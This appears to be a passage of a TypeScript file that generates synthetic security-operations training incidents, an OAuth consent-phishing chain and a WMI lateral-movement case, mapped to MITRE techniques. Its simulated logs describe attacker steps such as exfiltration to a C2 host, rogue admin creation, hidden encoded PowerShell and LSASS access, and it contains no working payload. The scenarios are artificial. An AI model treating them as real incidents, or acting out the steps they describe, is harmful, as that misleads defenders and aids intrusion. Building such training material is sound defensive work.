    const rogueAdmin = `it-support-${randomHex(4)}@corp.com`;
    let data = `INCIDENT: Cloud Identity Abuse — OAuth Consent Phishing\n`;
    data += `Platform: Microsoft 365 / Azure AD | Affected User: ${user}@corp.com\n`;
    data += `Detection: Microsoft Sentinel | Timestamp: ${ts(base,0)}\n\n`;
    data += `=== ALERT 1: Suspicious OAuth App Consent ===\n`;
    data += `App Name: "${appName}"\n`;
    data += `App ID: ${appId}\n`;
    data += `Publisher: ${['Microsott Corp (typosquat)','Azure Team LLC (unverified)','Cloud Security Inc. (not Microsoft)'][rnd(0,2)]}\n`;
    data += `Permissions Granted: Mail.ReadWrite, Files.ReadWrite.All, offline_access\n`;
    data += `Consent IP: ${extIp} (unexpected country)\n`;
    data += `User-Agent: Mozilla/5.0 Python-urllib/3.${rnd(8,11)}\n\n`;
    data += `=== ALERT 2: Impossible Travel Detected ===\n`;
    data += `User: ${user}@corp.com\n`;
    data += `Location 1: ${ts(base,0)} — authenticated from corporate office\n`;
    data += `Location 2: ${ts(base,900)} — authenticated from ${extIp} (${rnd(4000,9000)} km away)\n`;
    data += `Time delta: 15 minutes — PHYSICALLY IMPOSSIBLE\n\n`;
    if (difficulty !== 'beginner') {
      data += `=== ALERT 3: Graph API Mass Data Read ===\n`;
      data += `${ts(base,1320)} App: ${appId}\n`;
      data += `GET /v1.0/me/messages?$top=999 × ${rnd(10,20)} calls\n`;
      data += `Messages read: ${emailsRead.toLocaleString()} | Duration: ${rnd(3,8)} min\n`;
      data += `Exfil destination: ${extIp} (${c2Domain})\n\n`;
      data += `=== ALERT 4: Rogue Global Administrator Created ===\n`;
      data += `${ts(base,1680)} Actor: ${user}@corp.com (compromised OAuth token)\n`;
      data += `New account: ${rogueAdmin}\n`;
      data += `Roles: Global Administrator, Exchange Administrator\n`;
      data += `MFA Status: NOT CONFIGURED\n\n`;
    }
    if (difficulty === 'advanced') {
      data += `=== ALERT 5: Bulk SharePoint Download ===\n`;
      data += `${ts(base,2040)} Actor: ${rogueAdmin}\n`;
      data += `Sites: HR-Confidential, Finance-Board-${new Date().getFullYear()}, M&A-Pipeline\n`;
      data += `Files: ${rnd(1000,3000).toLocaleString()} files (${rnd(10,50)}.${rnd(1,9)} GB) → ${extIp}\n\n`;
      data += `=== THREAT INTEL (Needs Enrichment) ===\n`;
      data += `${extIp} — [PENDING ENRICHMENT]\n`;
      data += `App ID ${appId.slice(0,8)} — [PENDING ENRICHMENT]\n\n`;
    }
    data += `Enrich this Sentinel incident: classify the full attack chain (initial access → exfiltration), enrich all IOCs, identify persistence mechanisms established, assess data exposure, and outline emergency containment steps.`;

    return {
      id: `GEN-CI-${randomHex(6).toUpperCase()}`,
      title: `[Generated] OAuth Token Theft – ${user}@corp`,
      taskType: inferredTask,
      difficulty,
      attackCategory: 'Cloud Identity Abuse',
      mitre: {
        tactic: 'Credential Access / Collection / Persistence',
        techniques: ['T1528 – Steal Application Access Token', 'T1530 – Data from Cloud Storage', 'T1136.003 – Create Account: Cloud Account'],
      },
      iocs: { ips: [extIp], domains: [c2Domain], hashes: [], other: [`App ID: ${appId}`, `Rogue admin: ${rogueAdmin}`] },
      description: `Generated: OAuth consent phishing → ${emailsRead.toLocaleString()} emails read → rogue Global Admin created. ${difficulty} difficulty.`,
      incidentData: data,
      generated: true,
    };
  }

  // ── Lateral Movement (default/fallback) ────────────────────────────────────
  const data = `INCIDENT: Lateral Movement Detected\n` +
    `Source: ${host1} (${intIp1}) → Targets: ${host2} (${intIp2}), ${srv}\n` +
    `Account: ${user} | Timestamp: ${ts(base,0)}\n\n` +
    `[Security] EventID=4648: ${user} → ${host2} (Type 3 Network Logon)\n` +
    `[Sysmon] EventID=1: powershell.exe -EncodedCommand [base64] -NoProfile -W Hidden\n` +
    `  Parent: WmiPrvSE.exe (WMI execution)\n` +
    `[Sysmon] EventID=3: powershell.exe → ${extIp}:443 (${c2Domain})\n` +
    `[Security] EventID=4672: ${user} — SeDebugPrivilege assigned\n` +
    `[Security] EventID=4648: ${user} → ${srv} (Type 3 Network Logon)\n` +
    `[Sysmon] EventID=10: powershell.exe → lsass.exe (GrantedAccess: 0x1010)\n\n` +
    `Analyze this lateral movement: reconstruct the attack path, map to MITRE ATT&CK, extract IOCs, and provide containment steps.`;

  return {
    id: `GEN-LM-${randomHex(6).toUpperCase()}`,
    title: `[Generated] Lateral Movement – ${host1} → ${host2}`,
    taskType: inferredTask,
    difficulty,
    attackCategory: 'Lateral Movement',
    mitre: { tactic: 'Lateral Movement / Credential Access', techniques: ['T1021.006 – WMI', 'T1059.001 – PowerShell', 'T1003.001 – LSASS'] },
    iocs: { ips: [extIp, intIp1, intIp2], domains: [c2Domain], hashes: [] },
    description: `Generated: WMI-based lateral movement from ${host1} to ${host2}. PowerShell C2 + LSASS access. ${difficulty} difficulty.`,
    incidentData: data,
    generated: true,
  };
}

// ─── Selectors ────────────────────────────────────────────────────────────────

export function getDojo2ScenariosByTask(taskType: Dojo2TaskType): Dojo2IncidentScenario[] {
  return DOJO2_PREBUILT_SCENARIOS.filter((s) => s.taskType === taskType);
}

export function getDojo2AllPrebuilt(): Dojo2IncidentScenario[] {
  return DOJO2_PREBUILT_SCENARIOS;
}

export const DOJO2_ATTACK_CATEGORIES: Dojo2AttackCategory[] = [
  'Brute Force',
  'Phishing',
  'Lateral Movement',
  'Ransomware',
  'C2 Beaconing',
  'Credential Dumping',
  'DNS Tunneling',
  'Malware Execution',
  'Supply Chain',
  'Cloud Identity Abuse',
];

export const DOJO2_TASK_LABELS: Record<Dojo2TaskType, string> = {
  'log-triage':           'Log Triage',
  'alert-enrichment':     'Alert Enrichment',
  'detection-rule-gen':   'Detection Rule Gen',
  'incident-report-draft':'Incident Report',
};
